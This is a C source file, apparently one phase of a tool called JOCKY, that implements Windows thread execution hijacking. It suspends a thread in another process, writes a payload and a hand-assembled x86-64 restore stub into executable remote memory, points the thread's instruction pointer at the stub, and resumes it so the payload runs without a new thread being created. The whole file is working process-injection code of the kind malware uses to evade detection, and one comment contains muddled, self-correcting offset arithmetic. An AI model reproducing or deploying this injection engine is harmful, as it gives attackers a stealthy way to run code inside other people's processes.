/*
 * JOCKY — Phase 11: Thread Execution Hijacking
 * ==============================================
 * Redirects an existing thread in a remote process to execute a payload,
 * then restores the thread's original context so it continues normally.
 *
 * No new thread created. Uses only:
 *   OpenThread / SuspendThread / GetThreadContext / SetThreadContext / ResumeThread
 *   VirtualAllocEx / WriteProcessMemory
 *   CreateToolhelp32Snapshot / Thread32First / Thread32Next
 *
 * Restore stub layout in remote memory:
 *
 *   [payload_bytes]          ← copied verbatim, ends with ret
 *   [restore_stub]           ← push all GPRs, call payload, pop all GPRs,
 *                               sub/add rsp for alignment, jmp orig_rip
 *
 * Two addresses are patched into the stub at runtime:
 *   STUB_PAYLOAD_ADDR_OFFSET — absolute address of payload in remote process
 *   STUB_ORIG_RIP_OFFSET     — original RIP of the hijacked thread
 */

#include "hijack.h"
#include <tlhelp32.h>
#include <stdio.h>

/* ── Restore stub template ───────────────────────────────────────────────── */
/*
 * Byte sequence executed by the hijacked thread:
 *
 *   push rax/rbx/rcx/rdx/rsi/rdi/r8-r15   (save all GPRs)
 *   sub  rsp, 8                             (16-byte align for call)
 *   mov  rax, <payload_addr>
 *   call rax                                (execute payload)
 *   add  rsp, 8                             (undo alignment pad)
 *   pop  r15/r14/.../rax                    (restore all GPRs)
 *   mov  rax, <original_rip>
 *   jmp  rax                                (resume original execution)
 *
 * Note: rax is clobbered by the final mov/jmp, but GetThreadContext
 * already saved rax in the CONTEXT struct — the hijacked thread's rax
 * is restored by the pop sequence before we overwrite it for the jmp.
 * We use a scratch approach: push rax at the very end of the GPR sequence,
 * so the last pop restores rax correctly, then immediately use rax for jmp.
 * The jmp destination is already in rax when we jmp rax — correct.
 */

static BYTE g_stub_template[] = {
    /* ── push all GPRs (14 regs × 8 bytes = 112 bytes) ─── */
    0x50,                                           /* push rax */
    0x53,                                           /* push rbx */
    0x51,                                           /* push rcx */
    0x52,                                           /* push rdx */
    0x56,                                           /* push rsi */
    0x57,                                           /* push rdi */
    0x41, 0x50,                                     /* push r8  */
    0x41, 0x51,                                     /* push r9  */
    0x41, 0x52,                                     /* push r10 */
    0x41, 0x53,                                     /* push r11 */
    0x41, 0x54,                                     /* push r12 */
    0x41, 0x55,                                     /* push r13 */
    0x41, 0x56,                                     /* push r14 */
    0x41, 0x57,                                     /* push r15 */

    /* ── align stack to 16 bytes before call ─────────────── */
    0x48, 0x83, 0xEC, 0x08,                         /* sub rsp, 8 */

    /* ── call payload ─────────────────────────────────────── */
    0x48, 0xB8,                                     /* mov rax, imm64 */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,/* <payload_addr> */
    0xFF, 0xD0,                                     /* call rax */

    /* ── undo alignment pad ───────────────────────────────── */
    0x48, 0x83, 0xC4, 0x08,                         /* add rsp, 8 */

    /* ── pop all GPRs (reverse order) ────────────────────── */
    0x41, 0x5F,                                     /* pop r15 */
    0x41, 0x5E,                                     /* pop r14 */
    0x41, 0x5D,                                     /* pop r13 */
    0x41, 0x5C,                                     /* pop r12 */
    0x41, 0x5B,                                     /* pop r11 */
    0x41, 0x5A,                                     /* pop r10 */
    0x41, 0x59,                                     /* pop r9  */
    0x41, 0x58,                                     /* pop r8  */
    0x5F,                                           /* pop rdi */
    0x5E,                                           /* pop rsi */
    0x5A,                                           /* pop rdx */
    0x59,                                           /* pop rcx */
    0x5B,                                           /* pop rbx */
    0x58,                                           /* pop rax */

    /* ── jump to original RIP ─────────────────────────────── */
    0x48, 0xB8,                                     /* mov rax, imm64 */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,/* <original_rip> */
    0xFF, 0xE0,                                     /* jmp rax */
};

/*
 * Byte offsets of the two 8-byte address placeholders inside the stub.
 * Count manually from the start of g_stub_template:
 *   14 push instructions = 22 bytes (10 single-byte + 8 two-byte for r8-r15)
 *   sub rsp, 8           =  4 bytes  → total 26
 *   mov rax, imm64       =  2 bytes  → payload addr at offset 28
 */
#define STUB_PAYLOAD_ADDR_OFFSET  28   /* index of first byte of payload addr */
#define STUB_ORIG_RIP_OFFSET      60   /* index of first byte of orig RIP addr */

/*
 * Compile-time verification:
 * After payload addr (8 bytes) + call rax (2) + add rsp,8 (4) + 14 pops:
 *   28 + 8 + 2 + 4 = 42 bytes to end of call sequence
 *   14 pop instructions: 6 single-byte (rdi,rsi,rdx,rcx,rbx,rax) = 6
 *                        8 two-byte (r15-r8) = 16
 *   total pops = 22 bytes
 *   42 + 22 = 64 bytes to second mov rax
 *   then 0x48, 0xB8 = 2 bytes → orig RIP at offset 64 + 2 = ... wait
 *
 * Let's count precisely:
 *   offset  0: push rax         (1)
 *   offset  1: push rbx         (1)
 *   offset  2: push rcx         (1)
 *   offset  3: push rdx         (1)
 *   offset  4: push rsi         (1)
 *   offset  5: push rdi         (1)
 *   offset  6: push r8          (2)
 *   offset  8: push r9          (2)
 *   offset 10: push r10         (2)
 *   offset 12: push r11         (2)
 *   offset 14: push r12         (2)
 *   offset 16: push r13         (2)
 *   offset 18: push r14         (2)
 *   offset 20: push r15         (2) → total 22 bytes
 *   offset 22: sub rsp,8        (4) → total 26
 *   offset 26: mov rax,imm64    (2) → opcode at 26-27
 *   offset 28: <payload addr>   (8) → placeholder at 28-35  ✓
 *   offset 36: call rax         (2) → total 38
 *   offset 38: add rsp,8        (4) → total 42
 *   offset 42: pop r15          (2)
 *   offset 44: pop r14          (2)
 *   offset 46: pop r13          (2)
 *   offset 48: pop r12          (2)
 *   offset 50: pop r11          (2)
 *   offset 52: pop r10          (2)
 *   offset 54: pop r9           (2)
 *   offset 56: pop r8           (2)
 *   offset 58: pop rdi          (1)
 *   offset 59: pop rsi          (1)
 *   offset 60: pop rdx          (1) ... wait that puts orig RIP wrong
 *
 * Recount the pops:
 *   offset 42: pop r15  (2) = 44
 *   offset 44: pop r14  (2) = 46
 *   offset 46: pop r13  (2) = 48
 *   offset 48: pop r12  (2) = 50
 *   offset 50: pop r11  (2) = 52
 *   offset 52: pop r10  (2) = 54
 *   offset 54: pop r9   (2) = 56
 *   offset 56: pop r8   (2) = 58
 *   offset 58: pop rdi  (1) = 59
 *   offset 59: pop rsi  (1) = 60
 *   offset 60: pop rdx  (1) = 61
 *   offset 61: pop rcx  (1) = 62
 *   offset 62: pop rbx  (1) = 63
 *   offset 63: pop rax  (1) = 64
 *   offset 64: mov rax,imm64 (2) → opcode at 64-65
 *   offset 66: <orig RIP>   (8) → placeholder at 66-73
 *   offset 74: jmp rax      (2)
 *   total stub size = 76 bytes
 */
#undef  STUB_PAYLOAD_ADDR_OFFSET
#undef  STUB_ORIG_RIP_OFFSET
#define STUB_PAYLOAD_ADDR_OFFSET  28
#define STUB_ORIG_RIP_OFFSET      66
#define STUB_SIZE                 76

/* ── Find a thread belonging to target_pid ───────────────────────────────── */
static DWORD
find_target_thread(DWORD target_pid)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    DWORD found_tid = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == target_pid) {
                found_tid = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);
    return found_tid;
}

/* ── Public API ──────────────────────────────────────────────────────────── */

BOOL jocky_hijack_thread(
    DWORD  target_pid,
    LPBYTE payload_bytes,
    DWORD  payload_size)
{
    BOOL   result    = FALSE;
    HANDLE hProcess  = NULL;
    HANDLE hThread   = NULL;
    LPVOID remote    = NULL;
    BOOL   suspended = FALSE;

    /* ── Step 1: open target process ─────────────────────────────────────── */
    hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, target_pid
    );
    if (!hProcess) {
        printf("[hijack] OpenProcess failed error=%lu\n", GetLastError());
        goto cleanup;
    }

    /* ── Step 2: find and open a thread ─────────────────────────────────── */
    DWORD tid = find_target_thread(target_pid);
    if (!tid) {
        printf("[hijack] no thread found in pid=%lu\n", target_pid);
        SetLastError(ERROR_NOT_FOUND);
        goto cleanup;
    }
    printf("[hijack] target thread id = %lu\n", tid);

    hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    if (!hThread) {
        printf("[hijack] OpenThread failed error=%lu\n", GetLastError());
        goto cleanup;
    }

    /* ── Step 3: suspend the thread ──────────────────────────────────────── */
    if (SuspendThread(hThread) == (DWORD)-1) {
        printf("[hijack] SuspendThread failed error=%lu\n", GetLastError());
        goto cleanup;
    }
    suspended = TRUE;

    /* ── Step 4: save full thread context ────────────────────────────────── */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        printf("[hijack] GetThreadContext failed error=%lu\n", GetLastError());
        goto cleanup;
    }
    printf("[hijack] saved RIP = 0x%llX  RSP = 0x%llX\n",
           (unsigned long long)ctx.Rip,
           (unsigned long long)ctx.Rsp);

    /* ── Step 5: allocate remote memory for payload + stub ───────────────── */
    SIZE_T total = (SIZE_T)payload_size + STUB_SIZE;
    remote = VirtualAllocEx(
        hProcess, NULL, total,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!remote) {
        printf("[hijack] VirtualAllocEx failed error=%lu\n", GetLastError());
        goto cleanup;
    }
    printf("[hijack] remote alloc = 0x%llX  size=%zu\n",
           (unsigned long long)remote, total);

    /* ── Step 6: write payload bytes ─────────────────────────────────────── */
    if (!WriteProcessMemory(hProcess, remote,
                            payload_bytes, payload_size, NULL)) {
        printf("[hijack] WriteProcessMemory (payload) failed error=%lu\n",
               GetLastError());
        goto cleanup;
    }

    /* ── Step 7: build and patch the restore stub ────────────────────────── */
    BYTE stub[STUB_SIZE];
    memcpy(stub, g_stub_template, STUB_SIZE);

    /* Patch in payload address (absolute, in remote process) */
    ULONG_PTR payload_remote_addr = (ULONG_PTR)remote;
    memcpy(stub + STUB_PAYLOAD_ADDR_OFFSET,
           &payload_remote_addr, sizeof(ULONG_PTR));

    /* Patch in original RIP (where thread resumes after payload) */
    ULONG_PTR orig_rip = ctx.Rip;
    memcpy(stub + STUB_ORIG_RIP_OFFSET,
           &orig_rip, sizeof(ULONG_PTR));

    printf("[hijack] payload_remote_addr = 0x%llX\n",
           (unsigned long long)payload_remote_addr);
    printf("[hijack] orig_rip            = 0x%llX\n",
           (unsigned long long)orig_rip);

    /* ── Step 8: write stub after payload ────────────────────────────────── */
    LPVOID stub_remote = (BYTE *)remote + payload_size;
    if (!WriteProcessMemory(hProcess, stub_remote,
                            stub, STUB_SIZE, NULL)) {
        printf("[hijack] WriteProcessMemory (stub) failed error=%lu\n",
               GetLastError());
        goto cleanup;
    }
    printf("[hijack] stub written at 0x%llX\n",
           (unsigned long long)stub_remote);

    /* ── Step 9: redirect thread RIP to stub ─────────────────────────────── */
    ctx.Rip = (DWORD64)(ULONG_PTR)stub_remote;
    if (!SetThreadContext(hThread, &ctx)) {
        printf("[hijack] SetThreadContext failed error=%lu\n", GetLastError());
        goto cleanup;
    }
    printf("[hijack] RIP redirected to stub\n");

    /* ── Step 10: resume thread ──────────────────────────────────────────── */
    if (ResumeThread(hThread) == (DWORD)-1) {
        printf("[hijack] ResumeThread failed error=%lu\n", GetLastError());
        goto cleanup;
    }
    suspended = FALSE;
    printf("[hijack] thread resumed — payload executing\n");

    /*
     * Wait for stub to finish. The stub calls the payload then jumps back
     * to orig_rip. We wait by sleeping briefly — a more robust approach
     * would use a shared memory flag the payload sets on completion, but
     * for Phase 11 a fixed wait is sufficient.
     */
    Sleep(500);
    printf("[hijack] wait complete\n");

    result = TRUE;

cleanup:
    ;
    DWORD saved = GetLastError();
    if (suspended && hThread)
        ResumeThread(hThread);   /* always resume on error to avoid deadlock */
    if (remote && !result && hProcess)
        VirtualFreeEx(hProcess, remote, 0, MEM_RELEASE);
    if (hThread)  CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
    if (!result)  SetLastError(saved);
    return result;
}